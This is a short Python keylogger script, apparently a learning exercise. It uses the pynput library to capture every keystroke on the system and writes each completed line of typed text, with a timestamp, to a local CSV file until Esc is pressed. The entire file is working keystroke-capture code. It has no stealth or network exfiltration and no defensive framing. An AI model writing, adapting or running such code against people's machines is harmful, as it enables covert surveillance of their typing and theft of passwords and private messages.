from pynput import keyboard
import csv
from datetime import datetime
import time

#defining the file for storing the key logs
log_file = "key_log.csv"
buffer=""

#creating the csv file and header for the log file
with open(log_file,"w",newline="") as f:
    writer = csv.writer(f)
    #writing the header
    writer.writerow(["time","typed_texts"])

#defining the function for logging the key strokes
def on_press(key):
    global buffer
    try:
        buffer+=key.char
    except AttributeError:
        if key==keyboard.Key.space:
            buffer+=" "
        elif key==keyboard.Key.backspace:
            buffer=buffer[:-1]
        elif key==keyboard.Key.enter:
            if buffer.strip():
                time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(log_file,"a",newline="") as f:
                    writer =csv.writer(f)
                    writer.writerow([time_now,buffer])
            buffer=""

#defining the function for stoping the key logging
def on_release(key):
    if key==keyboard.Key.esc:
        return False

#starting the key logging for listening the log
with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()